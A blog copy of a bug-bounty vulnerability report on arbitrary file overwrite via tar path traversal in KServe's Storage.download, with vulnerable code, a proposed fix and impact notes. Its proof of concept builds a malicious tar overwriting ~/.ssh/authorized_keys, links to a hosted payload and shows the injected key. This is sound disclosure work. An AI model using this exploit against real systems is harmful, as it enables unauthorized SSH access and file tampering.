---
layout: post
title:  "Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative)"
date:  2024-07-09 10:31:06 +0800
categories: file-overwrite
---

## Name

> Huntr: Arbitrary File Overwrite in Kserve Storage.download API

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> 0.12.1

## Description

The Kserve python SDK provide extra [`Storage`](https://github.com/kserve/kserve/tree/master/python/kserve#pip-install) module to download model from [`storage providers`](https://github.com/kserve/kserve/tree/master/python/kserve#kserve-python-server). The [`Storage.download`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63) is called to download and extract the model to file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. 

Using above python sdk, a victim may download model from internet. Fisrt, [`Storage.download`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63) calls [`Storage._download_from_uri`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L695) to handle url download, and `Storage._download_from_uri` calls [`Storage._unpack_archive_file`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710) to extract the tarball model file.

The [`Storage.download`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63) function:

```
@staticmethod
def download(uri: str, out_dir: str = None) -> str:
    ...
    if uri.startswith(_GCS_PREFIX):
        Storage._download_gcs(uri, out_dir)
    elif uri.startswith(_S3_PREFIX):
        Storage._download_s3(uri, out_dir)
    elif uri.startswith(_HDFS_PREFIX) or uri.startswith(_WEBHDFS_PREFIX):
        Storage._download_hdfs(uri, out_dir)
    elif re.search(_AZURE_BLOB_RE, uri):
        Storage._download_azure_blob(uri, out_dir)
    elif re.search(_AZURE_FILE_RE, uri):
        Storage._download_azure_file_share(uri, out_dir)
    elif is_local:
        return Storage._download_local(uri, out_dir)
    elif re.search(_URI_RE, uri):
        return Storage._download_from_uri(uri, out_dir)
```

The [`_download_from_uri`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L624) function:

```
@staticmethod
def _download_from_uri(uri, out_dir=None):
    url = urlparse(uri)
    ...
    local_path = os.path.join(out_dir, filename)

    with requests.get(uri, stream=True, headers=headers) as response:
        ...
        if encoding == "gzip":
            stream = gzip.GzipFile(fileobj=response.raw)
            local_path = os.path.join(out_dir, f"{filename}.tar")
        else:
            stream = response.raw
        with open(local_path, "wb") as out:
            shutil.copyfileobj(stream, out)

    if mimetype in ["application/x-tar", "application/zip"]:
        Storage._unpack_archive_file(local_path, mimetype, out_dir)
```

The [`_unpack_archive_file`](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L700) function extracts tarball without sanitization:

```
@staticmethod
def _unpack_archive_file(file_path, mimetype, target_dir=None):
    if not target_dir:
        target_dir = os.path.dirname(file_path)

    try:
        logger.info("Unpacking: %s", file_path)
        if mimetype == "application/x-tar":
            archive = tarfile.open(file_path, "r", encoding="utf-8")
        else:
            archive = zipfile.ZipFile(file_path, "r")
        archive.extractall(target_dir)
        archive.close()
```

The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.

```
Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
```

## Proof of Concept

An attacker can create a malicous tar file using following command:

```
tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
```

Then, the attacker will upload the `hack.tar` to public server. 

I have uploaded one malicous tar file to gitlab for testing: [https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads](https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads)

If anyone now downloads tar using `Storage.download` api, causing automatically extracting the malicous tar file and overwrite files silently.

```
from kserve.storage import Storage
Storage.download("https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads")
```
We can check the paylod `authorized_keys` has been overwriten.
```
$ cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
```

Tested on Google Colab: [https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing](https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing)

![poc](https://live.staticflickr.com/65535/53746993646_c00cf1cf03_o_d.png)


## Fix

```
@staticmethod
def _unpack_archive_file(file_path, mimetype, target_dir=None):
    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
    def extraction_filter(member, path):
        """Run tarfile.tar_filter, but raise the expected ValueError"""
        # This is only called if the current Python has tarfile filters
        try:
            return tarfile.tar_filter(member, path)
        except tarfile.FilterError as exc:
            raise ValueError(str(exc))

    if not target_dir:
        target_dir = os.path.dirname(file_path)

    try:
        logger.info("Unpacking: %s", file_path)
        if mimetype == "application/x-tar":
            archive = tarfile.open(file_path, "r", encoding="utf-8")
        else:
            archive = zipfile.ZipFile(file_path, "r")
        archive.extraction_filter = extraction_filter
        archive.extractall(target_dir)
        archive.close()

```

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

[https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710](https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710)
